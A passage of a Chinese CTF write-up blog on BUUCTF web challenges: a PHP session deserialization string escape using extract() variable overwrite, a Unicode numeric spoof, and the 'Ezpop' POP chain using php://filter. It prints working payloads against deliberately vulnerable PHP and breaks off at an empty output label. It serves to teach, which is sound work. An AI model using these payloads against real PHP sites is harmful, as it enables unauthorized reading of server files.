class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>先分析</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$SESSION中:</span><br><span class="line">$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;</span><br><span class="line">$_SESSION[&#x27;function&#x27;] = $function  用户传进来的参数f, 这里应该是show_image</span><br><span class="line">$_SESSION[&#x27;img&#x27;] GET传一个img_path参数,先base64编码,再计算sha1</span><br></pre></td></tr></table></figure>

<p>给<code>function</code>传一下<code>phpinfo</code>,从<code>phpinfo</code>中得到提示,那么现在应该设法通过39行的<code> file_get_contents</code>来读取<code>d0g3_f1ag.php</code></p>
<img src="/images/buuctf-web/image-20221021090023073.png" alt="image-20221021090023073" style="zoom:80%;" />

<p>上面代码中,28行自己传<code>img_path</code>的话,这个值不仅要被编码,还要再计算一次<code>sha1</code>,但是最后读文件的时候只会对其进行一次解码,完全对不上,所以这条路走不通.  那么就不要传<code>img_path</code>,让其执行26行的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);</span><br></pre></td></tr></table></figure>

<p><strong>注意到19行的<code>extract($_POST);</code> 这就使得我们通过<code>POST</code>传的参数可以覆盖前面已经定义好的参数</strong></p>
<p>本地模拟一下:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>; <span class="comment">//将数组转化为字符串,并使用|分割,这里构造了一个正则匹配表达式</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>); <span class="comment">//将匹配到的替换为空,这里只是替换的化可以双写绕过</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="string">&#x27;show_image&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;image_path&#x27;</span>] = (<span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"><span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$serialize_info</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$userinfo</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>先不传POST, 输出:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:10:&quot;image_path&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:10:&quot;image_path&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br><span class="line">array(3) &#123; [&quot;user&quot;]=&gt; string(5) &quot;guest&quot; [&quot;function&quot;]=&gt; string(10) &quot;show_image&quot; [&quot;image_path&quot;]=&gt; string(20) &quot;Z3Vlc3RfaW1nLnBuZw==&quot; &#125;</span><br></pre></td></tr></table></figure>

<p>POST中输入:  这里发现不仅<code>_SESSION[user]</code>的值被修改了,<strong>而且<code>$_SESSION[&#39;function&#39;]</code>还被覆盖了</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=admin</span><br><span class="line">输出:</span><br><span class="line">a:2:&#123;s:4:&quot;user&quot;;s:5:&quot;admin&quot;;s:10:&quot;image_path&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br><span class="line">a:2:&#123;s:4:&quot;user&quot;;s:5:&quot;admin&quot;;s:10:&quot;image_path&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br><span class="line">array(2) &#123; [&quot;user&quot;]=&gt; string(5) &quot;admin&quot; [&quot;image_path&quot;]=&gt; string(20) &quot;Z3Vlc3RfaW1nLnBuZw==&quot; &#125;</span><br></pre></td></tr></table></figure>

<p>POST中输入,这里可以向<code>_SESSION</code>中加入新的参数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=admin&amp;_SESSION[abc]=abcd</span><br><span class="line">输出</span><br><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;admin&quot;;s:3:&quot;abc&quot;;s:4:&quot;abcd&quot;;s:10:&quot;image_path&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;admin&quot;;s:3:&quot;abc&quot;;s:4:&quot;abcd&quot;;s:10:&quot;image_path&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br><span class="line">array(3) &#123; [&quot;user&quot;]=&gt; string(5) &quot;admin&quot; [&quot;abc&quot;]=&gt; string(4) &quot;abcd&quot; [&quot;image_path&quot;]=&gt; string(20) &quot;Z3Vlc3RfaW1nLnBuZw==&quot; &#125;</span><br><span class="line">这里发现_SESSION中原有的function被覆盖了</span><br></pre></td></tr></table></figure>

<p>那么现在的目标是设法让最后的<code>img</code>失效,并且替换成我们自己可控的<code>img</code></p>
<p>这里给<code>_SESSION[a]</code>传<code>aa&quot;;s:3:&quot;img&quot;;s:5:&quot;abcde&quot;;&#125;</code> 第一个右双引号提前闭合本来包裹它的左双引号,最后使用<code>&#125;</code>提前闭合整个序列化的字符串,这样以来,原有的<code>img</code>就被排除在了外面, 但是从下面反序列化的结果也可以看出,反序列化之后,原来的<code>img</code>仍然在这个数组中,而我们传的那个<code>img</code>仍被算在<code>_SESSION[a]</code>中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;sssss&quot;;s:1:&quot;a&quot;;s:27:&quot;aa&quot;;s:3:&quot;img&quot;;s:5:&quot;abcde&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;sssss&quot;;s:1:&quot;a&quot;;s:27:&quot;aa&quot;;s:3:&quot;img&quot;;s:5:&quot;abcde&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br><span class="line">array(3) &#123; [&quot;user&quot;]=&gt; string(5) &quot;sssss&quot; [&quot;a&quot;]=&gt; string(27) &quot;aa&quot;;s:3:&quot;img&quot;;s:5:&quot;abcde&quot;;&#125;&quot; [&quot;img&quot;]=&gt; string(20) &quot;Z3Vlc3RfaW1nLnBuZw==&quot; &#125;</span><br></pre></td></tr></table></figure>

<p>那么现在需要利用一下前面的过滤函数,打乱前面的引号配对关系,让系统在反序列化时把我们自己传的这个<code>img</code>当作<code>_SESSION</code>中的元素</p>
<p>这里我们需要把序列化字符串中,<code>img</code>之前的内容,也就是 <code>&quot;;s:1:&quot;a&quot;;s:27:&quot;aa</code> 这一段都归入<code>_SESSION[user]</code>的值,这一段的长度是18,那么就让序列化字符串中<code>user</code>的值的长度显示为18, 所以这里给<code>user</code>传<code>flagflagflagphpphp</code>,这个串中的所有字符都会被过滤函数替换为空,所以处理后的序列化字符串也就变成了下面代码框中第二个这样. 这里:</p>
<p><code>s:4:&quot;user&quot;;s:18:&quot;</code><strong><code>&quot;;s:1:&quot;a&quot;;s:27:&quot;aa</code></strong><code>&quot;;s:3:&quot;img&quot;;s:5:&quot;abcde&quot;;</code> </p>
<p><code>user</code>的值实际上是加粗的这一段,其长度为18. 因此,在反序列化时,系统就会按照18的长度去匹配后面的值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagphpphp&amp;_SESSION[a]=aa&quot;;s:3:&quot;img&quot;;s:5:&quot;abcde&quot;;&#125;</span><br><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:18:&quot;flagflagflagphpphp&quot;;s:1:&quot;a&quot;;s:27:&quot;aa&quot;;s:3:&quot;img&quot;;s:5:&quot;abcde&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:18:&quot;&quot;;s:1:&quot;a&quot;;s:27:&quot;aa&quot;;s:3:&quot;img&quot;;s:5:&quot;abcde&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br><span class="line">bool(false)</span><br></pre></td></tr></table></figure>

<p>但上面最后反序列化输出了<code>false</code>,其原因是经过上面的处理过后, 这个数组实际上就剩两个参数了(<code>user</code>和我们自己传的<code>img</code>),但序列化的字符串起始还标记着有三个参数,自然反序列化就失败了</p>
<p>所以这里再从<code>img</code>后面添加一个无关紧要的参数即可</p>
<p>可以看到这里反序列化成功了,且成功地将原有的<code>img</code>替换成了我们可控的<code>img</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagphpphp&amp;_SESSION[a]=aa&quot;;s:3:&quot;img&quot;;s:5:&quot;abcde&quot;;s:1:&quot;b&quot;;s:1:&quot;c&quot;;&#125;</span><br><span class="line">输出:</span><br><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:18:&quot;flagflagflagphpphp&quot;;s:1:&quot;a&quot;;s:43:&quot;aa&quot;;s:3:&quot;img&quot;;s:5:&quot;abcde&quot;;s:1:&quot;b&quot;;s:1:&quot;c&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:18:&quot;&quot;;s:1:&quot;a&quot;;s:43:&quot;aa&quot;;s:3:&quot;img&quot;;s:5:&quot;abcde&quot;;s:1:&quot;b&quot;;s:1:&quot;c&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br><span class="line">array(3) &#123; [&quot;user&quot;]=&gt; string(18) &quot;&quot;;s:1:&quot;a&quot;;s:43:&quot;aa&quot; [&quot;img&quot;]=&gt; string(5) &quot;abcde&quot; [&quot;b&quot;]=&gt; string(1) &quot;c&quot; &#125;</span><br></pre></td></tr></table></figure>

<p>所以拿到这道题里,把<code>img</code>的值换成我们所需读取的<code>d0g3_f1ag.php</code>的<code>base64</code>编码: 注意长度那里也得改</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagphpphp&amp;_SESSION[a]=aa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;b&quot;;s:1:&quot;c&quot;;&#125;</span><br><span class="line">源码里输出:</span><br><span class="line">&lt;?php</span><br><span class="line">$flag = &#x27;flag in /d0g3_fllllllag&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>那么继续去读取这个文件:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagphpphp&amp;_SESSION[a]=aa&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:1:&quot;b&quot;;s:1:&quot;c&quot;;&#125;</span><br><span class="line"></span><br><span class="line">输出flag</span><br></pre></td></tr></table></figure>



<p>这里用到了字符串逃逸,变量覆盖. 提前闭合引号和花括号,理解起来有点像<code>sql</code>注入时的一些场景</p>
<br>

<hr>
<br>

<h1 id="unicode欺骗-Unicorn-shop"><a href="#unicode欺骗-Unicorn-shop" class="headerlink" title="[unicode欺骗]Unicorn shop"></a>[unicode欺骗]Unicorn shop</h1><img src="/images/buuctf-web/image-20221021115425088-1667047819736138.png" alt="image-20221021115425088" style="zoom:67%;" />

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">id=1&amp;price=2  ---Wrong commodity!</span><br><span class="line">id=1&amp;price=a  ---Error parsing money!</span><br><span class="line">id=1&amp;price=a2 ---Only one char(?) allowed!</span><br><span class="line">id=&amp;price=2  ---No commodity found!</span><br><span class="line">id=1&amp;price=</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;/usr/local/lib/python2.7/site-packages/tornado/web.py&quot;, line 1541, in _execute</span><br><span class="line">    result = method(*self.path_args, **self.path_kwargs)</span><br><span class="line">  File &quot;/app/sshop/views/Shop.py&quot;, line 34, in post</span><br><span class="line">    unicodedata.numeric(price)</span><br><span class="line">TypeError: need a single Unicode character as parameter</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">id=4&amp;price=0  --You don&amp;#39;t have enough money!</span><br></pre></td></tr></table></figure>

<p>只能买第四件商品才不会报错, 而且<code>price</code>还只能输入1个字符,无法输入1337</p>
<img src="/images/buuctf-web/image-20221021114227729.png" alt="image-20221021114227729" style="zoom:80%;" />



<p><strong><code>unicode</code>欺骗</strong>,</p>
<p>去<a target="_blank" rel="noopener" href="https://unicode-table.com/en/search/?q=thousand">unicode-table</a>找一个比1337大的单个字符</p>
<img src="/images/buuctf-web/image-20221021115803524-1667047819736137.png" alt="image-20221021115803524" style="zoom:67%;" />

<img src="/images/buuctf-web/image-20221021115650004-1667047819736139.png" alt="image-20221021115650004" style="zoom:67%;" />



<br>

<hr>
<br>

<h1 id="反序列化pop链-Ezpop"><a href="#反序列化pop链-Ezpop" class="headerlink" title="[反序列化pop链]Ezpop"></a>[反序列化pop链]Ezpop</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Show</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>突破口是<code>Modifier</code>类的<code>append</code>方法, 进行文件包含</p>
<p>调用<code>append</code>的是<code>__invoke</code>, <strong>这个魔术方法在尝试将对象调用为函数时触发.</strong> </p>
<p>为了达到最终<code>include</code>的目的调用它的时候需要<code>Modifier</code>中的<code>var</code>属性值需要是我们要读取的<code>flag.php</code></p>
<p>那么现在需要找哪里能够把变量当函数调用, 这里找到第43行,<code>Test</code>类的<code>__get</code>方法,这个魔术方法在<strong>读取不可访问的属性的值时会被调用（不可访问包括私有属性，或者没有初始化的属性）</strong></p>
<p>那么这里就需要<code>$function</code>的值是<code>Modifier</code>的一个对象</p>
<p>42行,<code>function变量</code>赋值于<code>Test</code>的<code>p</code>属性,它初始化时是一个新建立的数组</p>
<p>那么如何调用<code>__get</code>呢,这里看到24行的<code>__toString</code>中调用了尚未初始化的的<code>str</code></p>
<p>最后<code>Show</code>类中<code>__wakeup</code>方法的<code>preg_match</code>能够触发<code>__toString</code>方法</p>
<p>最后反序列化一个<code>show</code>类的对象,就能够触发其<code>__wakeup</code>方法</p>
<p>那么把上述过程反推,就可以构造pop链:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span> = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>-&gt;p = <span class="variable">$a</span>; </span><br><span class="line"><span class="variable">$c</span>-&gt;str = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$d</span>-&gt;source = <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$d</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">过程分析: 首先这里拿到了$d序列化后的字符串,当这个字符串送到题目程序里进行反序列化时:</span></span><br><span class="line"><span class="comment">1.触发$d的__wakeup, 对$d-&gt;source,也就是$c进行正则匹配,这个过程把$c当成字符串,所以触发了$c的__tostring</span></span><br><span class="line"><span class="comment">2.$c的__tostring返回的是$c-&gt;str-&gt;source,而$c-&gt;str是$b,所以这里返回的是$b-&gt;str,而$b中这个属性并不存在,所以触发了$b的__get方法.</span></span><br><span class="line"><span class="comment">3.$b的__get方法会将$b-&gt;p,也就是$a当作函数执行,由此触发$a的__invoke方法</span></span><br><span class="line"><span class="comment">4.$a的__invoke方法调用$a的append方法,最终执行了include(&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>输出:</p>
